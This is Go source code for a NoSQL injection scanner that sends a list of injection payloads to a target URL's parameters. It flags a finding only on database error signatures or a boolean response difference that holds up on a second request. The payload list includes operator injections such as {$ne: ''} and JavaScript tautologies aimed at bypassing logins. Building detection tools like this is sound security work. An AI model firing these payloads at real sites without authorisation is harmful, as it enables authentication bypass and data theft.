package native

import (
	"fmt"
	"time"
)

type NoSQLiResult struct {
	Endpoint   string `json:"endpoint"`
	Parameter  string `json:"parameter"`
	Payload    string `json:"payload"`
	Vulnerable bool   `json:"vulnerable"`
	Evidence   string `json:"evidence"`
}

// TestNoSQLi looks for database-specific error signatures and confirmed
// boolean differentials.  The previous implementation reported every HTTP 200
// response as a NoSQL bypass, which produced a "vulnerability" on virtually
// every website.
func TestNoSQLi(baseURL string, params map[string]string) []NoSQLiResult {
	errorPayloads := []string{
		`' || '1'=='1`,
		`' || 1==1 //`,
		`" || "1"=="1`,
		`' || '1'=='1' //`,
		`' || 1==1//`,
		`' && 1==2 //`,
		`{$gt: ''}`,
		`{$ne: ''}`,
		`{$regex: ".*"}`,
		`[$regex=.*]`,
		`' && this.credential == 'admin`,
		`';return true;var foo='`,
		`{"$gt": ""}`,
		`{"$ne": ""}`,
		`{"$regex": ".*"}`,
	}

	booleanPairs := []struct {
		truePayload  string
		falsePayload string
	}{
		{`' || '1'=='1`, `' || '1'=='2`},
		{`' || 1==1 //`, `' || 1==2 //`},
	}

	client := scanClient(15 * time.Second)
	results := make([]NoSQLiResult, 0)
	seen := make(map[string]bool)

	add := func(param, payload, evidence string) {
		key := param + "\x00" + payload
		if seen[key] {
			return
		}
		seen[key] = true
		results = append(results, NoSQLiResult{
			Endpoint:   baseURL,
			Parameter:  param,
			Payload:    payload,
			Vulnerable: true,
			Evidence:   evidence,
		})
	}

	for param, original := range params {
		baselineStatus, baselineBody, _, err := paramRequest(client, baseURL, params, param, original)
		if err != nil {
			continue
		}

		for _, payload := range errorPayloads {
			status, body, err := newParamRequest(client, baseURL, params, param, original+payload)
			if err != nil {
				continue
			}
			if signature := newSignature(body, baselineBody, nosqlErrorSignatures); signature != "" {
				add(param, payload, fmt.Sprintf(
					"NoSQL database error signature %q (HTTP %d -> %d)",
					signature, baselineStatus, status))
			}
		}

		for _, pair := range booleanPairs {
			trueStatus, trueBody, err := newParamRequest(client, baseURL, params, param, original+pair.truePayload)
			if err != nil {
				continue
			}
			falseStatus, falseBody, err := newParamRequest(client, baseURL, params, param, original+pair.falsePayload)
			if err != nil {
				continue
			}
			if trueStatus != falseStatus || trueStatus >= 500 || falseStatus >= 500 {
				continue
			}
			if absInt(len(trueBody)-len(falseBody)) < 40 || responseDiffRatio(trueBody, falseBody) < 0.05 {
				continue
			}
			// Re-test to filter pages whose length changes on every request.
			_, trueBody2, err := newParamRequest(client, baseURL, params, param, original+pair.truePayload)
			if err != nil {
				continue
			}
			_, falseBody2, err := newParamRequest(client, baseURL, params, param, original+pair.falsePayload)
			if err != nil {
				continue
			}
			if absInt(len(trueBody2)-len(falseBody2)) < 40 || responseDiffRatio(trueBody2, falseBody2) < 0.05 {
				continue
			}
			add(param, pair.truePayload+" / "+pair.falsePayload, fmt.Sprintf(
				"NoSQL boolean differential confirmed: true=%d bytes, false=%d bytes",
				len(trueBody2), len(falseBody2)))
		}
	}

	if len(results) == 0 {
		results = append(results, NoSQLiResult{
			Endpoint:   baseURL,
			Vulnerable: false,
			Evidence:   fmt.Sprintf("No NoSQL injection detected after baseline comparison (%d payloads)", len(errorPayloads)),
		})
	}

	return results
}
